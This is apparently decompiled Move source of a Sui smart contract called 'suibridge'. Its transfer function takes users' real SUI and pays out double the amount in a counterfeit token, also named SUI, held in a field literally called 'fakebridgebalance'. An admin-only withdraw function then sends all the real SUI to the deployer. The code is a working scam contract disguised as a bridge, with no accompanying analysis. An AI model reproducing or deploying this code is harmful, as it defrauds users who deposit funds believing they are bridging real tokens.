module 0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::suibridge {
    struct Bridge has key {
        id: 0x2::object::UID,
        suibalance: 0x2::balance::Balance<0x2::sui::SUI>,
        fakebridgebalance: 0x2::balance::Balance<0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::sui::SUI>,
        admin: address,
    }

    public entry fun transfer(arg0: &mut Bridge, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::put<0x2::sui::SUI>(&mut arg0.suibalance, arg1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::sui::SUI>>(0x2::coin::take<0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::sui::SUI>(&mut arg0.fakebridgebalance, 0x2::coin::value<0x2::sui::SUI>(&arg1) * 2, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun depositBridgeSUI(arg0: &mut Bridge, arg1: 0x2::coin::Coin<0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::sui::SUI>) {
        0x2::coin::put<0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::sui::SUI>(&mut arg0.fakebridgebalance, arg1);
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Bridge{
            id                : 0x2::object::new(arg0),
            suibalance        : 0x2::balance::zero<0x2::sui::SUI>(),
            fakebridgebalance : 0x2::balance::zero<0x58156e414780a5a237db71afb0d852674eff8cd98f9572104cb79afeb4ad1e9d::sui::SUI>(),
            admin             : 0x2::tx_context::sender(arg0),
        };
        0x2::transfer::share_object<Bridge>(v0);
    }

    public entry fun owner(arg0: &mut Bridge, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.admin, 0);
        arg0.admin = arg1;
    }

    public entry fun withdraw(arg0: &mut Bridge, arg1: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg1) == arg0.admin, 0);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::take<0x2::sui::SUI>(&mut arg0.suibalance, 0x2::balance::value<0x2::sui::SUI>(&arg0.suibalance), arg1), arg0.admin);
    }

    // decompiled from Move bytecode v6
}

